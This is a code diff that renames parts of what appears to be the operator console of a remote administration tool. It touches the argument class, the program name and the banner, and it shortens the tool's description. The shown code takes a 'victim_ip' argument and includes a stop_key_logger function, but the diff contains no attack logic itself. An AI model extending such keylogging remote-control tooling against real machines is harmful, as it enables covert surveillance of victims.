@@ -81,14 +81,14 @@ MENU_OPTIONS = (
 
 
 @dataclass
-class ControllerArgs:
+class CommanderArgs:
     victim_ip: str
     key: str
 
 
 @dataclass
 class Context:
-    args: ControllerArgs | None = None
+    args: CommanderArgs | None = None
     error_message: str | None = None
     error_code: int = 1
     destination_ip: str = ""
@@ -512,8 +512,8 @@ def handle_error(ctx: Context):
 
 def parse_arguments(ctx: Context, argv: list[str] | None = None):
     parser = argparse.ArgumentParser(
-        prog="controller",
-        description="Control center for the remote administration tool.",
+        prog="commander",
+        description="Command center.",
     )
     parser.add_argument("-a", "--address", dest="victim_ip", required=True,
                         metavar="<victim_ip>",
@@ -527,7 +527,7 @@ def parse_arguments(ctx: Context, argv: list[str] | None = None):
     except SystemExit as exc:
         sys.exit(1 if exc.code else 0)
 
-    ctx.args = ControllerArgs(victim_ip=parsed.victim_ip, key=parsed.key)
+    ctx.args = CommanderArgs(victim_ip=parsed.victim_ip, key=parsed.key)
 
 
 def handle_arguments(ctx: Context):
@@ -1196,7 +1196,7 @@ def stop_key_logger(ctx: Context):
 
 
 if __name__ == "__main__":
-    print("--------------- CONTROLLER ---------------")
+    print("--------------- COMMANDER ---------------")
     ctx = Context()
     parse_arguments(ctx)
     handle_arguments(ctx)
